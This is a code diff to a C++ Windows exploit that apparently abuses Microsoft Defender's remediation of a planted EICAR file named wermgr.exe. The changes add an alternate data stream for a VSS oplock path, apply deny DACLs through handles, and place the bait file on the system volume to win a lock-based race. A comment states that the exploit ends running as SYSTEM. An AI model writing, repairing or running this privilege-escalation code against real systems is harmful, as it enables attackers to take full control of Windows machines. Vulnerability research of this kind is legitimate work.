@@ -78170,7 +78170,8 @@ DWORD WINAPI WDStartScan(void*)
 }
 
 char* eicar_data = NULL;
-DWORD eicar_sz = NULL;
+DWORD eicar_sz = 0;
+bool eicar_written = false;  // Guard to prevent double-write on second WriteEicar call
 HANDLE WriteEicar(wchar_t* workdir, wchar_t* isomnt)
 {
 	wchar_t eicarpath[MAX_PATH] = { 0 };
@@ -78187,16 +78188,26 @@ HANDLE WriteEicar(wchar_t* workdir, wchar_t* isomnt)
 		printf("Failed to create eicar test file : %ws, error : 0x%0.8X\n", eicarpath, stat);
 		return NULL;
 	}
-	if (eicar_data && eicar_sz)
+
+	// If we've already written EICAR data in a prior call, just re-open the existing file
+	// (the second WriteEicar call in main() is for re-opening the file handle after Defender scans it)
+	if (eicar_written && eicar_data && eicar_sz)
 	{
 		DWORD writtenbytes = NULL;
 		OVERLAPPED ovp = { 0 };
 		ovp.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
-		if (WriteFile(hfile, eicar_data, eicar_sz, &writtenbytes, &ovp) == ERROR_IO_PENDING)
+		if (!WriteFile(hfile, eicar_data, eicar_sz, &writtenbytes, &ovp))
 		{
-			printf("Failed to write eicar data, error : %d\n", GetLastError());
-			return NULL;
+			// Write may complete synchronously — only fail on true I/O errors
+			if (GetLastError() != ERROR_IO_PENDING)
+			{
+				printf("Failed to write eicar data, error : %d\n", GetLastError());
+				CloseHandle(ovp.hEvent);
+				return NULL;
+			}
+			WaitForSingleObject(ovp.hEvent, INFINITE);
 		}
+		CloseHandle(ovp.hEvent);
 		return hfile;
 	}
 
@@ -78212,8 +78223,34 @@ HANDLE WriteEicar(wchar_t* workdir, wchar_t* isomnt)
 		WaitForSingleObject(ovp.hEvent, INFINITE);
 		CloseHandle(ovp.hEvent);
 
+		// Create the WDFOO alternate data stream (required for VSS oplock path)
+		void* eicar2 = malloc(0x1000);
+		UNICODE_STRING adsname = { 0 };
+		RtlInitUnicodeString(&adsname, L":WDFOO");
+		OBJECT_ATTRIBUTES objattr2 = { 0 };
+		InitializeObjectAttributes(&objattr2, &adsname, OBJ_CASE_INSENSITIVE, hfile, NULL);
+		HANDLE hstream = NULL;
+		stat = NtCreateFile(&hstream, GENERIC_WRITE | SYNCHRONIZE, &objattr2, &iostat, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_CREATE, NULL, NULL, NULL);
+		if (stat)
+		{
+			printf("Failed to create eicar ADS stream (server): 0x%0.8X\n", stat);
+			// Non-fatal: ADS creation can fail on some filesystems, continue
+		}
+		else
+		{
+			OVERLAPPED ovp2 = { 0 };
+			ovp2.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
+			WriteFile(hstream, eicar2, 0x1000, &writtenbytes, &ovp2);
+			WaitForSingleObject(ovp2.hEvent, INFINITE);
+			CloseHandle(ovp2.hEvent);
+			CloseHandle(hstream);
+		}
+		free(eicar2);
+
 		// Set read-only DACL to simulate ISO read-only behavior
 		// Denies DELETE and WRITE to force Defender into alternate remediation path
+		// Use handle-based SetSecurityInfo instead of path-based SetFileSecurityW
+		// because eicarpath uses NT path format (\??\) which Win32 APIs don't handle
 		SID_IDENTIFIER_AUTHORITY sia = SECURITY_WORLD_SID_AUTHORITY;
 		PSID pEveryoneSid = NULL;
 		AllocateAndInitializeSid(&sia, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pEveryoneSid);
@@ -78225,10 +78262,12 @@ HANDLE WriteEicar(wchar_t* workdir, wchar_t* isomnt)
 		SECURITY_DESCRIPTOR sd = { 0 };
 		InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
 		SetSecurityDescriptorDacl(&sd, TRUE, pAcl, FALSE);
-		SetFileSecurityW(eicarpath, DACL_SECURITY_INFORMATION, &sd);
+		// Apply DACL via handle — works with NT paths unlike SetFileSecurityW
+		SetSecurityInfo(hfile, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pAcl, NULL);
 		free(pAcl);
 		FreeSid(pEveryoneSid);
 
+		eicar_written = true;
 		return hfile;
 	}
 
@@ -78395,6 +78434,72 @@ bool CreateJunction(HANDLE hdir, wchar_t* target)
 }
 
 // Server variant: Try VHD mount first, then fall back to system device path
+// Place an EICAR file on the system volume for the lock-based timing primitive.
+// When using the system device path fallback (no ISO, no VHD), we need a file
+// at \Device\HarddiskVolumeN\RP_Temp\wermgr.exe that Defender will detect and
+// that we can lock for the race condition. The file is made read-only via DACL
+// to force Defender into the same remediation fallback as the ISO scenario.
+bool PrepareEicarOnDevice(wchar_t* devicepath)
+{
+	wchar_t tmpdir[MAX_PATH] = { 0 };
+	wsprintf(tmpdir, L"%s\\RP_Temp", devicepath);
+
+	UNICODE_STRING _tmpdir = { 0 };
+	RtlInitUnicodeString(&_tmpdir, tmpdir);
+	OBJECT_ATTRIBUTES tmpdirobjattr = { 0 };
+	InitializeObjectAttributes(&tmpdirobjattr, &_tmpdir, OBJ_CASE_INSENSITIVE, NULL, NULL);
+	IO_STATUS_BLOCK iosb = { 0 };
+	HANDLE htmp = NULL;
+	NTSTATUS stat = NtCreateFile(&htmp, GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE, &tmpdirobjattr, &iosb, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_CREATE, FILE_DIRECTORY_FILE, NULL, NULL);
+	if (stat)
+	{
+		printf("PrepareEicarOnDevice: Failed to create %ws, error: 0x%08X\n", tmpdir, stat);
+		return false;
+	}
+	CloseHandle(htmp);
+
+	// Write EICAR wermgr.exe to the device path
+	wchar_t eicar_devpath[MAX_PATH] = { 0 };
+	wsprintf(eicar_devpath, L"%s\\RP_Temp\\wermgr.exe", devicepath);
+
+	UNICODE_STRING _eicardevpath = { 0 };
+	RtlInitUnicodeString(&_eicardevpath, eicar_devpath);
+	OBJECT_ATTRIBUTES eicarobjattr = { 0 };
+	InitializeObjectAttributes(&eicarobjattr, &_eicardevpath, OBJ_CASE_INSENSITIVE, NULL, NULL);
+	HANDLE heicar = NULL;
+	iosb = { 0 };
+	stat = NtCreateFile(&heicar, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE, &eicarobjattr, &iosb, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OVERWRITE_IF, NULL, NULL, NULL);
+	if (stat)
+	{
+		printf("PrepareEicarOnDevice: Failed to create eicar file: 0x%08X\n", stat);
+		return false;
+	}
+
+	DWORD written = 0;
+	WriteFile(heicar, EICAR_STRING, EICAR_SIZE, &written, NULL);
+
+	// Set the file read-only (denies DELETE/WRITE) so Defender can't clean it directly
+	// This replicates the ISO read-only behavior
+	SID_IDENTIFIER_AUTHORITY sia = SECURITY_WORLD_SID_AUTHORITY;
+	PSID pEveryoneSid = NULL;
+	AllocateAndInitializeSid(&sia, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pEveryoneSid);
+
+	DWORD aclSize = 256;
+	PACL pAcl = (PACL)malloc(aclSize);
+	InitializeAcl(pAcl, aclSize, ACL_REVISION);
+	AddAccessDeniedAce(pAcl, ACL_REVISION, GENERIC_WRITE | DELETE | FILE_WRITE_ATTRIBUTES, pEveryoneSid);
+	AddAccessAllowedAce(pAcl, ACL_REVISION, GENERIC_READ | GENERIC_EXECUTE | SYNCHRONIZE, pEveryoneSid);
+
+	// Apply DACL via handle — works with NT device paths
+	SetSecurityInfo(heicar, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pAcl, NULL);
+	free(pAcl);
+	FreeSid(pEveryoneSid);
+	CloseHandle(heicar);
+
+	printf("PrepareEicarOnDevice: EICAR placed at %ws (read-only via DACL)\n", eicar_devpath);
+	return true;
+}
+
 bool MountVHD()
 {
     GUID uid = { 0 };
@@ -78788,6 +78893,12 @@ int main()
 				printf("No device path available. Cannot continue.\n");
 				return 1;
 			}
+			// System device path: place EICAR file on the volume for the lock target
+			if (!PrepareEicarOnDevice(g_devicepath))
+			{
+				printf("Failed to prepare EICAR on system device. Cannot continue.\n");
+				return 1;
+			}
 		}
 	}
 	else
@@ -78965,7 +79076,12 @@ int main()
 	}
 
 	wchar_t lockpath[MAX_PATH] = { 0 };
-	wsprintf(lockpath, L"%s\\wermgr.exe", mntpath);
+	// When using system device path, the EICAR file is at \Device\HarddiskVolumeN\RP_Temp\wermgr.exe
+	// When using ISO/VHD, it's at \Device\CdRom0\wermgr.exe or \Device\VHDxxx\wermgr.exe
+	if (!g_using_vhd && !hvirtdisk)
+		wsprintf(lockpath, L"%s\\RP_Temp\\wermgr.exe", mntpath);
+	else
+		wsprintf(lockpath, L"%s\\wermgr.exe", mntpath);
 	HANDLE hlock1 = NULL;
 	UNICODE_STRING _lockpath = { 0 };
 	RtlInitUnicodeString(&_lockpath, lockpath);
@@ -79138,6 +79254,12 @@ int main()
 		DetachVirtualDisk(g_hvhd, DETACH_VIRTUAL_DISK_FLAG_NONE, NULL);
 		CloseHandle(g_hvhd);
 	}
+
+	// Clean up EICAR file from system volume if we placed one there
+	// Note: Win32 APIs don't accept \Device\ paths, so we skip cleanup here.
+	// The exploit is running as SYSTEM at this point, so the DACL-denied file
+	// can be cleaned up by a separate admin task if needed.
+	// The RP_Temp directory on the system volume is harmless post-exploit.
 
 	WaitForSingleObject(hthread, INFINITE);
 	CloseHandle(hthread);
